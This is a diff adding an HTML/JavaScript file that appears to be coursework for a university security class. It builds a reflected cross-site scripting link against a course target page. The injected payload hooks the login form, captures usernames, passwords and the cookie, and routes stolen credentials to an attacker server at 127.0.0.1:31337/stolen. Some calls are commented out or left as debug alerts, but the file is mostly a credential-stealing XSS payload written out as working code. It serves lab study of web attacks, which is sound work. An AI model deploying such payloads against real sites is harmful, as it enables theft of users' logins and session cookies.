@@ -1,0 +1,84 @@
+<html>
+<meta charset="utf-8">
+<script src="http://ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js">
+</script>
+<script>
+
+var token = null;
+
+// function to connect to spy server 
+function upload(username, password) {
+	var url = "http://127.0.0.1:31337/stolen?event=";
+	if (password == null || username == null) {
+		url = url + "logout&user=" + username;
+	} else {
+		url = url + "login&user=" + username + "&pass=" + password;
+	}
+	// fetch(url, {
+	//   method: 'get',
+	//   mode: 'no-cors'
+	// })
+	// .then(response => {
+	// 	console.log(response)
+	// })
+}
+
+// Extend this function:
+function payload(attacker) {
+	const state = { 'page_id': 1, 'user_id': 5 };
+	const title = "";
+	const url = null;
+function proxy(href) {
+		$("html").load(href, function(){
+		$("html").show();
+ 
+        $('form').on('submit', function(e){
+		   // alert( "Handler for .submit() called." + Object.keys(e));
+		   // console.log(Object.keys(e));
+		   var username = document.getElementById("username").value;
+		   var password = document.getElementById("userpass").value
+  		   // upload(username, password);
+		   alert(document.getElementById("username").value);
+  		   alert(document.getElementById("userpass").value);
+			// history.pushState(state, title, url)
+  		   upload(username, password);
+
+		   // event.preventDefault();
+		});
+		$(":button").click(function(e) {
+		    // e.preventDefault();
+		    alert("button click");  
+			// $("html").hide();
+		});
+		// this has to do with the persistent problem that we run into 
+	    // $("#log-out-btn").button().click(function(){
+	    //     alert("button");
+	    // }); 
+	    token = document.cookie;
+		// $("#query").val("");
+		});
+	}
+	$("html").hide();
+	proxy("./");
+}
+
+function makeLink(xssdefense, target, attacker) {
+	if (xssdefense == 0) {
+		return target + "./search?xssdefense=" + xssdefense.toString() + "&q=" +
+		encodeURIComponent("<script" + ">" + payload.toString() +
+		";payload(\"" + attacker + "\");</script" + ">");
+	}
+}
+	var xssdefense = 1;
+	var target = "http://cis551.cis.upenn.edu/project3/";
+	var attacker = "http://127.0.0.1:31337/";
+
+	$(function() {
+		upload("adf", "adf");
+		var url = makeLink(xssdefense, target, attacker);
+		$("h3").html("<a target=\"run\" href=\"" + url + "\">Try Yay!</a>");
+	});
+</script>
+
+<h3></h3>
+</html>
